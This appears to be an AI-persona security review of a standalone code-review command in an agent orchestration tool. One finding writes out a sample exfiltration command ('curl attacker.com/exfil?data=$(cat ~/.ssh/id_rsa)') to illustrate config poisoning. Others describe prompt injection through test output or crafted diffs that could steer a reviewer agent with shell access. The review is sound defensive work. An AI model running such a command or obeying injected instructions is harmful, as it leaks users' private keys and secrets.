# Review by Staff Security Engineer (Round 1)

Now I have a comprehensive view of the implementation. Let me produce my review.

---

## Security Review: Standalone `colonyos review <branch>` Command

### Completeness Assessment

All major PRD functional requirements are implemented:
- ✅ FR-1 through FR-6: CLI registration with all flags
- ✅ FR-7 through FR-9: Branch validation with remote ref rejection
- ✅ FR-10 through FR-13: Standalone review template, diff extraction with truncation
- ✅ FR-14 through FR-17: Parallel persona reviews with correct tools
- ✅ FR-18 through FR-21: Fix loop with standalone prompts
- ✅ FR-22 through FR-24: Review artifacts with correct naming
- ✅ FR-25: Decision gate
- ✅ FR-26 through FR-29: Summary output and exit codes
- ✅ FR-30 through FR-31: Budget enforcement
- ✅ FR-32: No RunLog

All 358 tests pass. No linter issues observed.

### Security-Specific Findings

VERDICT: request-changes

FINDINGS:
- [src/colonyos/orchestrator.py:282]: **MEDIUM — `shell=True` in `_run_verify_command()`**: The `verify_command` is executed via `subprocess.run(cmd, shell=True)`. While this command comes from the local `.colonyos/config.yaml` (which the repo owner controls), it's still a shell injection surface. If a malicious actor submits a PR that modifies `.colonyos/config.yaml` to set `verify_command: "curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"`, the next `colonyos run` would execute that. **Mitigation**: Document this trust boundary clearly; consider validating that `verify_command` only contains allowlisted patterns, or at minimum log a warning when the verify command changes between runs.
- [src/colonyos/orchestrator.py:282]: **LOW — No output sanitization**: The verify command output (up to 4000 chars) is passed directly into an LLM prompt via `_build_verify_fix_prompt()`. While this is a standard pattern, adversarial test output could attempt prompt injection. This is a known limitation of agent-based systems, not specific to this PR.
- [src/colonyos/orchestrator.py:840-870]: **INFO — `_validate_branch_exists` and `_get_branch_diff` use safe subprocess calls**: These correctly use list-form `subprocess.run()` (no `shell=True`) and use `--` to terminate git option parsing, preventing branch names from being interpreted as flags. Good practice.
- [src/colonyos/instructions/review_standalone.md]: **INFO — Reviewers still have `Bash` tool access**: As noted in the PRD's open questions (Q2), reviewers get `["Read", "Glob", "Grep", "Bash"]`. The `Bash` tool in review context is not truly read-only — a malicious instruction template could instruct a reviewer agent to exfiltrate secrets or destroy data. This is explicitly deferred per the PRD but remains the #1 security concern for this feature.
- [src/colonyos/cli.py]: **LOW — `_print_review_summary` doesn't pass `decision_verdict`**: The `review` CLI command calls `_print_review_summary(phase_results, reviewers, total_cost)` but never passes `decision_verdict`, so even when `--decide` is used, the decision verdict won't appear in the summary table. This is a functional bug, not a security issue.
- [src/colonyos/init.py]: **LOW — `_detect_test_command` reads untrusted files**: The auto-detection reads `Makefile`, `package.json`, etc. from the repo to infer a test command. The detected command is then stored in config and later executed with `shell=True`. A malicious repo could have a `Makefile` with a `test:` target to get auto-detected, though the user confirms during `colonyos init`, which provides a human-in-the-loop gate.
- [src/colonyos/orchestrator.py]: **INFO — No audit trail for standalone reviews**: Unlike the full pipeline (which has `RunLog`), standalone reviews have no persistent record of what the agent did, what tools it called, or what commands it ran. The only artifacts are the review markdown files. For a tool that runs arbitrary code in repos, this makes post-incident forensics difficult. This is a design limitation acknowledged by FR-32.

SYNTHESIS:
From a supply chain security perspective, this implementation is **reasonably sound for v1** but has two systemic concerns that should be tracked. First, `shell=True` for `verify_command` is the most concrete attack surface — it's mitigated by the fact that config is local and user-confirmed, but a config-poisoning attack via a malicious PR is plausible. Second, the `Bash` tool in reviewer hands remains the biggest blast-radius concern for the standalone review feature — a prompt injection via crafted diff content could theoretically instruct a reviewer agent to execute arbitrary commands. Both are acknowledged as deferred in the PRD. The implementation itself follows good subprocess hygiene elsewhere (list-form args, `--` terminators), has proper budget guards to limit runaway costs, validates branches locally, and rejects remote refs. The functional bug where `--decide` verdict isn't printed in the summary table should be fixed before merge. **I'm requesting changes solely for the `decision_verdict` passthrough bug** — the security items are tracked deferrals, not blockers.